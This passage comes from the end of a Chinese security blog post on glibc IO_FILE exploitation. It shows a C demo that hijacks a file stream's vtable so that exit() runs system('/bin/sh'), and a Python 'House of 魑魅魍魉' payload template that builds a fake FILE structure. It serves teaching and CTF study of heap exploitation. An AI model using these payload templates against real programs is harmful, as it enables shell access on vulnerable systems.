fake_put_stream[<span class="number">6</span>] = memcpy_got_addr + <span class="number">0x28</span>;     <span class="comment">// _IO_write_end</span></span><br><span class="line">    fake_put_stream[<span class="number">7</span>] = <span class="number">0</span>;                          <span class="comment">// _IO_buf_base</span></span><br><span class="line">    fake_put_stream[<span class="number">8</span>] = (<span class="type">size_t</span>) <span class="number">-1</span>;                <span class="comment">// _IO_buf_end</span></span><br><span class="line">    fake_put_stream[<span class="number">17</span>] = (<span class="type">size_t</span>) large + <span class="number">0x1000</span>;   <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    fake_put_stream[<span class="number">27</span>] = IO_str_jumps_addr;         <span class="comment">// vtable -&gt; _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line">    write_base[<span class="number">0</span>] = (<span class="type">size_t</span>) system;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;write_base[<span class="number">2</span>], <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FSOP</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>攻击模板如下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># largebin_attack 攻击 house_魑魅魍魉</span></span><br><span class="line"><span class="comment"># 为确保正确执行，需要利用 COMPILE_WPRINTF==1 的模式</span></span><br><span class="line"> </span><br><span class="line">fake_io_addr = heap_addr + <span class="number">0x1390</span></span><br><span class="line">put_stream_offset = <span class="number">0x30</span>  <span class="comment"># put_stream 距离 fake_io 的偏移</span></span><br><span class="line">put_stream_addr = fake_io_addr + put_stream_offset</span><br><span class="line">write_target_addr = memcpy_addr</span><br><span class="line">target_value_offset = <span class="number">0x200</span>  <span class="comment"># 需要执行的函数存储的地址距离 fake_io 的偏移</span></span><br><span class="line">target_value_addr = fake_io_addr  + target_value_offset</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IO_wide_data_addr = fake_io_addr + <span class="number">0xe0</span> <span class="comment"># len(IO_IFLE) 利用原有的宽字符</span></span><br><span class="line"><span class="comment"># 再一次执行到 memcpy时rdi的地址</span></span><br><span class="line">rdi_offset = <span class="number">0xf</span>  <span class="comment"># 因为 _IO_write_ptr 会加1，此处确保内存对齐</span></span><br><span class="line">rdi_addr = target_value_addr + rdi_offset</span><br><span class="line"><span class="comment"># more_len &gt; count_len &gt; 0x20 可以再次执行 memcpy</span></span><br><span class="line">more_len = <span class="number">0x80</span>*<span class="number">8</span>   <span class="comment"># 为什么 IO_help_jump_0_ 里面还要在右边移位2位？？</span></span><br><span class="line">count_len= <span class="number">0x28</span> <span class="comment"># 要大于0x20</span></span><br><span class="line">_flags = <span class="number">0x400</span> <span class="comment">#_flags == 0x400 执行 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">fake_io_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(_flags) <span class="comment"># 此处是 put_stream 起始地址; _flags == 0x400 执行 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span></span><br><span class="line">fake_io_file += p64(rdi_addr)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(write_target_addr - <span class="number">0x20</span>)</span><br><span class="line">fake_io_file += p64(write_target_addr)</span><br><span class="line">fake_io_file += p64(write_target_addr + count_len)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 用于绕过  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only)) 不执行malloc</span></span><br><span class="line">fake_io_file += p64((<span class="number">1</span>&lt;&lt;<span class="number">64</span>)-<span class="number">1</span>)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>) <span class="comment">#可写</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(IO_wide_data_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(IO_help_jump_0_addr)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>) <span class="comment">#可写</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(target_value_addr)</span><br><span class="line">fake_io_file += p64(target_value_addr + more_len)</span><br><span class="line">fake_io_file += p64(IO_str_jumps_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x1b8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(put_stream_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(target_value_offset - <span class="number">0x10</span>,<span class="string">b&quot;\x00&quot;</span>)  <span class="comment"># largbin_attak 时需要 - 0x10</span></span><br><span class="line"> </span><br><span class="line">fake_io_file += p64(system_addr) + p64(<span class="number">0</span>)   <span class="comment"># 此段长度为 0x10 与 rdi_offset 对应</span></span><br><span class="line"> </span><br><span class="line">payload = fake_io_file + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure></div>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> linux IO_FILE 利用</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2024-11-08 03:07:36</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-11-20 03:32:13
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2024/11/08/linux-IO_FILE-exploit/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/linux-user-pwn/">#linux user pwn</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/11/08/linux-stack-overflow/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">linux 栈溢出</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/11/08/java-serialization/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">Java 反序列化</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">linux IO_FILE 利用</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#FILE-%E7%BB%93%E6%9E%84"><span class="nav-text">FILE 结构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fopen"><span class="nav-text">fopen</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fread"><span class="nav-text">fread</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fwrite"><span class="nav-text">fwrite</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fclose"><span class="nav-text">fclose</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-fileno-%E5%AD%97%E6%AE%B5%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"><span class="nav-text">利用 _fileno 字段泄露数据</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0-vtable-%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"><span class="nav-text">伪造 vtable 劫持程序流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FSOP"><span class="nav-text">FSOP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E7%9A%84%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8"><span class="nav-text">缓冲区的相关利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#stdin-%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E7%BC%93%E5%86%B2%E5%8C%BA%E8%BF%9B%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-text">stdin 标准输入缓冲区进行任意地址写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stdout-%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E7%BC%93%E5%86%B2%E5%8C%BA%E8%BF%9B%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-text">stdout 标准输入缓冲区进行任意地址读写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-text">任意地址写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="nav-text">任意地址读</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IO-str-jumps"><span class="nav-text">__IO_str_jumps</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A-IO-str-jumps-%E5%9C%B0%E5%9D%80"><span class="nav-text">确定 __IO_str_jumps 地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#io-str-finish"><span class="nav-text">io_str_finish</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8E%E5%A0%86%E5%88%A9%E7%94%A8%E7%BB%93%E5%90%88"><span class="nav-text">与堆利用结合</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2-libc-%E5%9F%BA%E5%9D%80"><span class="nav-text">泄露 libc 基址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0-vtable-%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B-1"><span class="nav-text">伪造 vtable 劫持程序流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FSOP-1"><span class="nav-text">FSOP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Orange"><span class="nav-text">House of Orange</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81-vtable-%E5%88%B0-IO-str-jumps"><span class="nav-text">劫持 vtable 到 _IO_str_jumps</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-validate-vtable-%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81"><span class="nav-text">利用 IO_validate_vtable 劫持程序流</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Husk"><span class="nav-text">House of Husk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Kiwi"><span class="nav-text">House of Kiwi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Pig"><span class="nav-text">House of Pig</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Emma"><span class="nav-text">House of Emma</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Apple1"><span class="nav-text">House of Apple1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Apple2-House-of-Cat"><span class="nav-text">House of Apple2 | House of Cat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-overflow%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="nav-text">利用_IO_wfile_overflow函数控制程序执行流</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-underflow-mmap%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="nav-text">利用_IO_wfile_underflow_mmap函数控制程序执行流</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-wdefault-xsgetn%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="nav-text">利用_IO_wdefault_xsgetn函数控制程序执行流</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-seekoff%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81%EF%BC%88House-of-Cat%EF%BC%89"><span class="nav-text">利用_IO_wfile_seekoff函数控制程序执行流（House of Cat）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Apple3"><span class="nav-text">House of Apple3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-underflow%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="nav-text">利用_IO_wfile_underflow函数控制程序执行流</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-underflow-mmap%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81-1"><span class="nav-text">利用_IO_wfile_underflow_mmap函数控制程序执行流</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-wdo-write%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="nav-text">利用_IO_wdo_write函数控制程序执行流</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-IO-wfile-sync%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="nav-text">使用_IO_wfile_sync函数控制程序执行流</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-%E7%90%B4%E7%91%9F%E7%90%B5%E7%90%B6-House-of-Obstack"><span class="nav-text">House of 琴瑟琵琶 | House of Obstack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Snake"><span class="nav-text">House of Snake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-%E9%AD%91%E9%AD%85%E9%AD%8D%E9%AD%89"><span class="nav-text">House of 魑魅魍魉</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        27 posts in total
                    </span>
                    
                        <span>
                            409.5k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>